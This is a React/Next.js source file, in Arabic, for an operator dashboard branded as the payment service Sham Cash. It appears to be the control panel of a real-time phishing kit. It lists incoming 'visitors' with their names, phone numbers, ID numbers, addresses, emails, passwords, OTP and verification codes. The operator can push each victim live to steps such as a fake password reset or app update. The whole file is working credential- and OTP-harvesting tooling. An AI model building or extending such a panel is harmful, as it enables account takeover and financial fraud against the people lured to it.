'use client';

import { useState, useMemo } from 'react';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useVisitorContext as useVisitors } from '@/contexts/VisitorContext';
import { useNewVisitorSound } from '@/hooks/useNewVisitorSound';
import { useSoundSystem } from '@/hooks/useSound';
import { Visitor, VisitorStep, STEP_LABELS, STEP_COLORS } from '@/lib/types';
import TransferVisitorModal from '@/components/TransferVisitorModal';
import DashboardGuard from '@/components/DashboardGuard';

// ── Helpers ────────────────────────────────────────────────────────────────────

const STEP_ICONS: Record<string, string> = {
  '1': '👤',
  '2': '📧',
  '3': '🔐',
  '4': '✅',
  'password-reset': '🔑',
  'app-update': '🔄',
};

const STEP_SHORT: Record<string, string> = {
  '1': 'معلومات',
  '2': 'بريد',
  '3': 'رمز',
  '4': 'تحقق',
  'password-reset': 'كلمة سر',
  'app-update': 'تحديث',
};

function caseId(id: string) {
  return id.replace(/-/g, '').slice(0, 6).toUpperCase();
}

function timeAgo(iso: string): string {
  const diff = Date.now() - new Date(iso).getTime();
  const s = Math.floor(diff / 1000);
  if (s < 60) return `منذ ${s} ث`;
  const m = Math.floor(s / 60);
  if (m < 60) return `منذ ${m} د`;
  const h = Math.floor(m / 60);
  if (h < 24) return `منذ ${h} س`;
  return `منذ ${Math.floor(h / 24)} يوم`;
}

function formatTime(iso: string): string {
  const d = new Date(iso);
  return d.toLocaleString('ar-SA', {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit',
  });
}

function statusLabel(v: Visitor): { label: string; cls: string; dot: string } {
  if (v.status === 'completed')
    return { label: 'مكتمل', cls: 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30', dot: 'bg-emerald-400' };
  if (v.status === 'pending')
    return { label: 'انتظار', cls: 'bg-amber-500/20 text-amber-400 border-amber-500/30', dot: 'bg-amber-400' };
  return { label: 'نشط', cls: 'bg-blue-500/20 text-blue-400 border-blue-500/30', dot: 'bg-blue-400' };
}

function maskPassword(p?: string) {
  if (!p) return '—';
  return p.slice(0, 2) + '••••••' + p.slice(-2);
}

// ── Sub-components ─────────────────────────────────────────────────────────────

function DataRow({ label, value, mono }: { label: string; value?: string; mono?: boolean }) {
  return (
    <div className="flex items-start justify-between gap-4 py-2.5 border-b border-[#2d3a4f]/60 last:border-0">
      <span className="text-[#6b7a94] text-sm shrink-0">{label}</span>
      <span className={`text-sm text-right break-all ${mono ? 'font-mono text-[#c8d0e0]' : 'text-[#c8d0e0]'} ${!value || value === '—' ? 'text-[#4a5568]' : ''}`}>
        {value || '—'}
      </span>
    </div>
  );
}

function SectionHeader({ title, icon }: { title: string; icon: React.ReactNode }) {
  return (
    <div className="flex items-center gap-2 mb-3">
      <span className="text-[#4A7FFF]">{icon}</span>
      <h3 className="text-[#a0aec0] text-xs font-semibold uppercase tracking-widest">{title}</h3>
    </div>
  );
}

// ── Case Row (left panel) ──────────────────────────────────────────────────────

function CaseRow({ visitor, selected, onClick }: {
  visitor: Visitor;
  selected: boolean;
  onClick: () => void;
}) {
  const stepKey = String(visitor.currentStep);
  const stepBg = STEP_COLORS[stepKey] || 'bg-gray-500';
  const { dot } = statusLabel(visitor);

  return (
    <button
      onClick={onClick}
      className={`w-full text-right px-4 py-3.5 border-b border-[#1e2a3a] transition-all duration-150 flex items-center gap-3 group ${
        selected
          ? 'bg-[#1e3050] border-r-2 border-r-[#4A7FFF]'
          : 'hover:bg-[#1a2a3f]'
      }`}
    >
      {/* Status dot */}
      <span className={`w-2 h-2 rounded-full shrink-0 ${dot}`} />

      {/* Avatar */}
      <div className={`w-9 h-9 rounded-xl flex items-center justify-center text-white font-bold text-sm shrink-0 ${stepBg}`}>
        {visitor.name.charAt(0)}
      </div>

      {/* Info */}
      <div className="flex-1 min-w-0">
        <div className="flex items-center justify-between gap-2">
          <span className={`font-semibold text-sm truncate ${selected ? 'text-white' : 'text-[#c8d0e0]'}`}>
            {visitor.name}
          </span>
          <span className="text-[#4a5568] text-xs shrink-0">{timeAgo(visitor.createdAt)}</span>
        </div>
        <div className="flex items-center gap-2 mt-0.5">
          <span className="text-[#6b7a94] text-xs font-mono">#{caseId(visitor.id)}</span>
          <span className="text-[#4a5568] text-xs">·</span>
          <span className="text-[#6b7a94] text-xs">
            {STEP_ICONS[stepKey]} {STEP_SHORT[stepKey]}
          </span>
        </div>
      </div>
    </button>
  );
}

// ── Visitor Detail Panel (right) ───────────────────────────────────────────────

function VisitorFilePanel({
  visitor,
  onTransfer,
  onComplete,
  onWaiting,
  onRemove,
  onOpenTransferModal,
  lastTransferred,
}: {
  visitor: Visitor;
  onTransfer: (visitorId: string, step: VisitorStep) => void;
  onComplete: (id: string) => void;
  onWaiting: (id: string) => void;
  onRemove: (id: string) => void;
  onOpenTransferModal: () => void;
  lastTransferred: string | null;
}) {
  const stepKey = String(visitor.currentStep);
  const stepBg = STEP_COLORS[stepKey] || 'bg-gray-500';
  const status = statusLabel(visitor);
  const rd = visitor.registrationData;
  const isCompleted = visitor.status === 'completed';
  const isJustTransferred = lastTransferred === visitor.id;

  return (
    <div className="flex flex-col h-full overflow-hidden">
      {/* ── File Header ── */}
      <div className="bg-[#172236] border-b border-[#2d3a4f] px-6 py-5 shrink-0">
        <div className="flex items-start justify-between gap-4">
          <div className="flex items-center gap-4">
            <div className={`w-14 h-14 rounded-2xl flex items-center justify-center text-white font-bold text-2xl shrink-0 ${stepBg}`}>
              {visitor.name.charAt(0)}
            </div>
            <div>
              <div className="flex items-center gap-3 flex-wrap">
                <h2 className="text-white font-bold text-xl leading-tight">{visitor.name}</h2>
                <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-semibold border ${status.cls}`}>
                  <span className={`w-1.5 h-1.5 rounded-full ${status.dot}`} />
                  {status.label}
                </span>
                {isJustTransferred && (
                  <span className="text-green-400 text-xs font-medium animate-pulse">✓ تم النقل</span>
                )}
              </div>
              <p className="text-[#6b7a94] text-sm mt-1">
                ملف رقم <span className="font-mono text-[#4A7FFF]">#{caseId(visitor.id)}</span>
                <span className="mx-2 text-[#2d3a4f]">|</span>
                {visitor.phone}
              </p>
            </div>
          </div>

          {/* Current Step Badge */}
          <div className={`shrink-0 px-3 py-2 rounded-xl text-white text-sm font-bold text-center ${stepBg}`}>
            <div className="text-lg">{STEP_ICONS[stepKey]}</div>
            <div className="text-xs mt-0.5 opacity-90">{STEP_SHORT[stepKey]}</div>
          </div>
        </div>

        {/* Progress bar */}
        <div className="mt-4 flex gap-1.5">
          {[1, 2, 3, 4].map((s) => {
            const stepNum = typeof visitor.currentStep === 'number' ? visitor.currentStep : 0;
            return (
              <div key={s} className="flex-1">
                <div className={`h-1.5 rounded-full transition-all duration-300 ${s <= stepNum ? stepBg : 'bg-[#2d3a4f]'}`} />
                <p className="text-[#4a5568] text-xs mt-1 text-center">
                  {s === 1 ? 'شخصي' : s === 2 ? 'بريد' : s === 3 ? 'رمز' : 'تحقق'}
                </p>
              </div>
            );
          })}
        </div>
      </div>

      {/* ── Scrollable File Body ── */}
      <div className="flex-1 overflow-y-auto">
        <div className="p-6 space-y-6">

          {/* Personal Information */}
          <div className="bg-[#172236] rounded-2xl p-5 border border-[#2d3a4f]">
            <SectionHeader
              title="المعلومات الشخصية"
              icon={
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                </svg>
              }
            />
            <DataRow label="الاسم الكامل" value={rd.fullName || visitor.name} />
            <DataRow label="رقم الهاتف" value={rd.phone || visitor.phone} mono />
            <DataRow label="رقم الهوية" value={rd.idNumber} mono />
            <DataRow label="العنوان" value={rd.address} />
          </div>

          {/* Account Information */}
          <div className="bg-[#172236] rounded-2xl p-5 border border-[#2d3a4f]">
            <SectionHeader
              title="معلومات الحساب"
              icon={
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              }
            />
            <DataRow label="البريد الإلكتروني" value={rd.email || visitor.email} mono />
            <DataRow label="كلمة المرور" value={maskPassword(rd.password)} mono />
            <DataRow label="رمز الأمان / OTP" value={rd.securityCode} mono />
            <DataRow label="رمز التحقق" value={rd.verificationCode} mono />
          </div>

          {/* Session Information */}
          <div className="bg-[#172236] rounded-2xl p-5 border border-[#2d3a4f]">
            <SectionHeader
              title="معلومات الجلسة"
              icon={
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              }
            />
            <DataRow label="وقت الدخول" value={formatTime(visitor.createdAt)} />
            <DataRow label="الخطوة الحالية" value={`${STEP_ICONS[stepKey]} ${STEP_LABELS[stepKey]}`} />
            <DataRow label="معرّف الملف" value={caseId(visitor.id)} mono />
            <DataRow
              label="الحالة"
              value={visitor.status === 'completed' ? 'مكتمل' : visitor.status === 'pending' ? 'في الانتظار' : 'نشط / متصل'}
            />
          </div>

          {/* Control Actions */}
          <div className="bg-[#172236] rounded-2xl p-5 border border-[#2d3a4f]">
            <SectionHeader
              title="لوحة التحكم"
              icon={
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z" />
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                </svg>
              }
            />

            <div className="grid grid-cols-2 gap-3">
              {/* Approve */}
              <button
                onClick={() => onComplete(visitor.id)}
                disabled={isCompleted}
                className={`flex items-center gap-2 px-4 py-3 rounded-xl text-sm font-semibold transition-all duration-200 ${
                  isCompleted
                    ? 'bg-[#2d3a4f]/40 text-[#4a5568] cursor-not-allowed'
                    : 'bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-400 border border-emerald-500/30 hover:border-emerald-500/50'
                }`}
              >
                <svg className="w-4 h-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                موافقة / إتمام
              </button>

              {/* Reject */}
              <button
                onClick={() => onRemove(visitor.id)}
                className="flex items-center gap-2 px-4 py-3 rounded-xl text-sm font-semibold bg-red-500/15 hover:bg-red-500/25 text-red-400 border border-red-500/30 hover:border-red-500/50 transition-all duration-200"
              >
                <svg className="w-4 h-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" />
                </svg>
                رفض / حذف
              </button>

              {/* Waiting */}
              <button
                onClick={() => onWaiting(visitor.id)}
                disabled={visitor.status === 'pending'}
                className={`flex items-center gap-2 px-4 py-3 rounded-xl text-sm font-semibold transition-all duration-200 ${
                  visitor.status === 'pending'
                    ? 'bg-[#2d3a4f]/40 text-[#4a5568] cursor-not-allowed'
                    : 'bg-amber-500/15 hover:bg-amber-500/25 text-amber-400 border border-amber-500/30 hover:border-amber-500/50'
                }`}
              >
                <svg className="w-4 h-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                وضع انتظار
              </button>

              {/* Transfer — opens detailed modal */}
              <button
                onClick={onOpenTransferModal}
                disabled={isCompleted}
                className={`flex items-center gap-2 px-4 py-3 rounded-xl text-sm font-semibold transition-all duration-200 ${
                  isCompleted
                    ? 'bg-[#2d3a4f]/40 text-[#4a5568] cursor-not-allowed'
                    : 'bg-[#4A7FFF]/15 hover:bg-[#4A7FFF]/25 text-[#4A7FFF] border border-[#4A7FFF]/30 hover:border-[#4A7FFF]/50'
                }`}
              >
                <svg className="w-4 h-4 shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4" />
                </svg>
                نقل إلى خطوة
              </button>
            </div>

            {/* Quick Transfer Shortcuts */}
            <div className="mt-4 pt-4 border-t border-[#2d3a4f]">
              <p className="text-[#6b7a94] text-xs mb-3">إرسال سريع إلى:</p>
              <div className="flex flex-wrap gap-2">
                {[
                  { step: 'password-reset' as VisitorStep, label: '🔑 إعادة كلمة السر', disabled: visitor.currentStep === 'password-reset' },
                  { step: 'app-update' as VisitorStep, label: '🔄 تحديث التطبيق', disabled: visitor.currentStep === 'app-update' },
                  { step: 1 as VisitorStep, label: '👤 الخطوة ١', disabled: visitor.currentStep === 1 },
                  { step: 2 as VisitorStep, label: '📧 الخطوة ٢', disabled: visitor.currentStep === 2 },
                  { step: 3 as VisitorStep, label: '🔐 الخطوة ٣', disabled: visitor.currentStep === 3 },
                ].map(({ step, label, disabled }) => (
                  <button
                    key={String(step)}
                    onClick={() => !disabled && !isCompleted && onTransfer(visitor.id, step)}
                    disabled={disabled || isCompleted}
                    className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-all duration-200 ${
                      disabled || isCompleted
                        ? 'bg-[#2d3a4f]/30 text-[#4a5568] cursor-not-allowed'
                        : 'bg-[#2d3a4f] hover:bg-[#3a4a5f] text-[#a0aec0] hover:text-white border border-[#4a5568] hover:border-[#4A7FFF]/50'
                    }`}
                  >
                    {label}
                  </button>
                ))}
              </div>
            </div>
          </div>

        </div>
      </div>
    </div>
  );
}

// ── Main Dashboard Content ────────────────────────────────────────────────────

function DashboardContent() {
  const router = useRouter();
  const {
    visitors,
    transferVisitor,
    completeVisitor,
    setVisitorStatus,
    removeVisitor,
    addVisitor,
  } = useVisitors();

  useNewVisitorSound(visitors.length);
  const { play } = useSoundSystem();

  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [showTransferModal, setShowTransferModal] = useState(false);
  const [filterStep, setFilterStep] = useState<string>('all');
  const [search, setSearch] = useState('');
  const [lastTransferred, setLastTransferred] = useState<string | null>(null);

  const selectedVisitor = useMemo(
    () => visitors.find((v) => v.id === selectedId) ?? null,
    [visitors, selectedId]
  );

  const handleTransfer = (visitorId: string, targetStep: VisitorStep) => {
    transferVisitor(visitorId, targetStep);
    play('transfer');
    setLastTransferred(visitorId);
    setTimeout(() => setLastTransferred(null), 2500);
  };

  const handleComplete = (visitorId: string) => {
    completeVisitor(visitorId);
    play('approval');
  };

  const handleWaiting = (visitorId: string) => {
    setVisitorStatus(visitorId, 'pending');
    play('alert');
  };

  const handleRemove = (visitorId: string) => {
    removeVisitor(visitorId);
    play('rejection');
    if (selectedId === visitorId) setSelectedId(null);
  };

  const handleLogout = () => {
    sessionStorage.removeItem('dashboard_auth');
    router.push('/login');
  };

  const handleAddTestVisitor = () => {
    const names = ['محمد عبدالله', 'سارة أحمد', 'عمر الحسن', 'نورا محمد', 'يوسف علي', 'ليلى سعيد'];
    const randomName = names[Math.floor(Math.random() * names.length)];
    addVisitor({
      name: randomName,
      phone: `05${Math.floor(10000000 + Math.random() * 90000000)}`,
      registrationData: { fullName: randomName },
    });
  };

  const stepCounts = visitors.reduce<Record<string, number>>((acc, v) => {
    const key = String(v.currentStep);
    acc[key] = (acc[key] || 0) + 1;
    return acc;
  }, {});

  const filteredVisitors = useMemo(() => {
    let list = visitors;
    if (filterStep !== 'all') list = list.filter((v) => String(v.currentStep) === filterStep);
    if (search.trim()) {
      const q = search.trim().toLowerCase();
      list = list.filter(
        (v) =>
          v.name.toLowerCase().includes(q) ||
          v.phone.includes(q) ||
          (v.registrationData.email || '').toLowerCase().includes(q) ||
          caseId(v.id).toLowerCase().includes(q)
      );
    }
    return list;
  }, [visitors, filterStep, search]);

  const activeCount = visitors.filter((v) => v.status === 'active').length;
  const pendingCount = visitors.filter((v) => v.status === 'pending').length;
  const completedCount = visitors.filter((v) => v.status === 'completed').length;

  return (
    <div className="h-screen bg-[#0f1923] flex flex-col overflow-hidden" dir="rtl">

      {/* ── Top Navigation ── */}
      <nav className="bg-[#141f2e] border-b border-[#1e2d3d] px-4 py-3 shrink-0">
        <div className="flex items-center justify-between gap-4">

          {/* Brand */}
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-[#4A7FFF] rounded-xl flex items-center justify-center shrink-0">
              <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 17v-2m3 2v-4m3 4v-6m2 10H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
              </svg>
            </div>
            <div>
              <h1 className="text-white font-bold text-base leading-tight">شام كاش</h1>
              <p className="text-[#4a5568] text-xs">نظام إدارة الملفات</p>
            </div>
          </div>

          {/* Stats Bar */}
          <div className="hidden md:flex items-center gap-1 bg-[#0f1923] rounded-xl px-3 py-2 border border-[#1e2d3d]">
            <div className="flex items-center gap-1.5 px-3 py-1 rounded-lg">
              <span className="w-2 h-2 rounded-full bg-blue-400" />
              <span className="text-[#a0aec0] text-xs">{visitors.length} إجمالي</span>
            </div>
            <div className="w-px h-4 bg-[#2d3a4f]" />
            <div className="flex items-center gap-1.5 px-3 py-1 rounded-lg">
              <span className="w-2 h-2 rounded-full bg-emerald-400" />
              <span className="text-[#a0aec0] text-xs">{activeCount} نشط</span>
            </div>
            <div className="w-px h-4 bg-[#2d3a4f]" />
            <div className="flex items-center gap-1.5 px-3 py-1 rounded-lg">
              <span className="w-2 h-2 rounded-full bg-amber-400" />
              <span className="text-[#a0aec0] text-xs">{pendingCount} انتظار</span>
            </div>
            <div className="w-px h-4 bg-[#2d3a4f]" />
            <div className="flex items-center gap-1.5 px-3 py-1 rounded-lg">
              <span className="w-2 h-2 rounded-full bg-purple-400" />
              <span className="text-[#a0aec0] text-xs">{completedCount} مكتمل</span>
            </div>
          </div>

          {/* Actions */}
          <div className="flex items-center gap-2">
            <Link
              href="/"
              className="flex items-center gap-2 bg-[#1e2d3d] hover:bg-[#2d3a4f] text-[#a0aec0] hover:text-white px-3 py-2 rounded-xl text-sm font-medium transition-all duration-200"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
              </svg>
              <span className="hidden sm:inline">الرئيسية</span>
            </Link>
            <button
              onClick={handleLogout}
              className="flex items-center gap-2 bg-red-500/10 hover:bg-red-500/20 text-red-400 hover:text-red-300 border border-red-500/20 px-3 py-2 rounded-xl text-sm font-medium transition-all duration-200"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" />
              </svg>
              <span className="hidden sm:inline">خروج</span>
            </button>
          </div>
        </div>
      </nav>

      {/* ── Body: Split Panel ── */}
      <div className="flex flex-1 overflow-hidden">

        {/* ── LEFT: Case List Panel ── */}
        <div className="w-full md:w-80 lg:w-96 shrink-0 bg-[#131d2a] border-l border-[#1e2d3d] flex flex-col overflow-hidden">

          {/* List Header */}
          <div className="px-4 pt-4 pb-3 border-b border-[#1e2d3d] shrink-0 space-y-3">
            {/* Search */}
            <div className="relative">
              <svg className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[#4a5568]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
              <input
                type="text"
                placeholder="بحث بالاسم، الهاتف، أو رقم الملف..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="w-full bg-[#0f1923] border border-[#2d3a4f] rounded-xl pr-9 pl-3 py-2 text-sm text-[#c8d0e0] placeholder-[#4a5568] focus:outline-none focus:border-[#4A7FFF]/50"
                dir="rtl"
              />
            </div>

            {/* Filter chips */}
            <div className="flex gap-1.5 overflow-x-auto pb-1 scrollbar-hide">
              {[
                { value: 'all', label: 'الكل', count: visitors.length },
                { value: '1', label: 'خ١', count: stepCounts['1'] },
                { value: '2', label: 'خ٢', count: stepCounts['2'] },
                { value: '3', label: 'خ٣', count: stepCounts['3'] },
                { value: '4', label: 'خ٤', count: stepCounts['4'] },
                { value: 'password-reset', label: '🔑', count: stepCounts['password-reset'] },
                { value: 'app-update', label: '🔄', count: stepCounts['app-update'] },
              ].map((f) => (
                <button
                  key={f.value}
                  onClick={() => setFilterStep(f.value)}
                  className={`shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-lg text-xs font-medium transition-all duration-150 ${
                    filterStep === f.value
                      ? 'bg-[#4A7FFF] text-white'
                      : 'bg-[#0f1923] border border-[#2d3a4f] text-[#6b7a94] hover:text-[#a0aec0]'
                  }`}
                >
                  {f.label}
                  {f.count ? (
                    <span className={`text-xs px-1 rounded ${filterStep === f.value ? 'bg-white/20' : 'bg-[#2d3a4f] text-[#a0aec0]'}`}>
                      {f.count}
                    </span>
                  ) : null}
                </button>
              ))}
            </div>
          </div>

          {/* Add test visitor button */}
          <div className="px-4 py-2 shrink-0 border-b border-[#1e2d3d]">
            <button
              onClick={handleAddTestVisitor}
              className="w-full flex items-center justify-center gap-2 py-2 rounded-xl text-xs font-medium bg-[#1e2d3d] hover:bg-[#2d3a4f] text-[#6b7a94] hover:text-[#a0aec0] border border-dashed border-[#2d3a4f] hover:border-[#4A7FFF]/40 transition-all duration-200"
            >
              <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
              </svg>
              إضافة ملف تجريبي
            </button>
          </div>

          {/* Case list */}
          <div className="flex-1 overflow-y-auto">
            {filteredVisitors.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-48 text-center px-6">
                <svg className="w-10 h-10 text-[#2d3a4f] mb-3" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                </svg>
                <p className="text-[#4a5568] text-sm">لا توجد ملفات</p>
              </div>
            ) : (
              filteredVisitors.map((v) => (
                <CaseRow
                  key={v.id}
                  visitor={v}
                  selected={selectedId === v.id}
                  onClick={() => setSelectedId(v.id)}
                />
              ))
            )}
          </div>
        </div>

        {/* ── RIGHT: Detail Panel ── */}
        <div className="flex-1 overflow-hidden bg-[#0f1923]">
          {selectedVisitor ? (
            <VisitorFilePanel
              visitor={selectedVisitor}
              onTransfer={handleTransfer}
              onComplete={handleComplete}
              onWaiting={handleWaiting}
              onRemove={handleRemove}
              onOpenTransferModal={() => setShowTransferModal(true)}
              lastTransferred={lastTransferred}
            />
          ) : (
            <div className="flex flex-col items-center justify-center h-full text-center px-8 select-none">
              <div className="w-20 h-20 rounded-3xl bg-[#1e2d3d]/50 flex items-center justify-center mb-6 border border-[#2d3a4f]">
                <svg className="w-10 h-10 text-[#2d3a4f]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                </svg>
              </div>
              <p className="text-[#4a5568] text-lg font-medium">اختر ملفاً لعرضه</p>
              <p className="text-[#2d3a4f] text-sm mt-2 max-w-xs">
                انقر على أي ملف من القائمة لعرض تفاصيله الكاملة والتحكم به
              </p>
              {visitors.length > 0 && (
                <p className="text-[#4A7FFF]/60 text-xs mt-4">
                  {visitors.length} ملف متاح — اختر من القائمة على اليمين
                </p>
              )}
            </div>
          )}
        </div>
      </div>

      {/* ── Transfer Modal ── */}
      {showTransferModal && selectedVisitor && (
        <TransferVisitorModal
          visitor={selectedVisitor}
          onTransfer={handleTransfer}
          onClose={() => setShowTransferModal(false)}
        />
      )}
    </div>
  );
}

export default function DashboardPage() {
  return (
    <DashboardGuard>
      <DashboardContent />
    </DashboardGuard>
  );
}
